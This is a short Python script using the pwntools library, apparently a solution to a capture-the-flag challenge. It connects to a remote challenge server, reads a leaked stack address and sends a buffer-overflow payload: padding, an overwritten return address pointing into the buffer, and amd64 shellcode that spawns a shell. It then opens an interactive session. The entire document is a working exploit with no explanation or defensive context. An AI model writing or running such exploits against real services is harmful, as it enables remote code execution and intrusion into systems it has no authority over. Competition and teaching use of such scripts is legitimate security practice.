from pwn import *
 
context(arch='amd64', os='linux')
r = remote('2018.finals.cyberchallenge.ru', 11001)
r.recvuntil(" = ")
line = r.recvline().strip()
address = int(line[2:], 16)
 
p = ''
p += 'A' * 0x8
p += p64(address + 0x10)
p += asm(shellcraft.amd64.sh())
 
raw_input()
r.send(p)
r.interactive()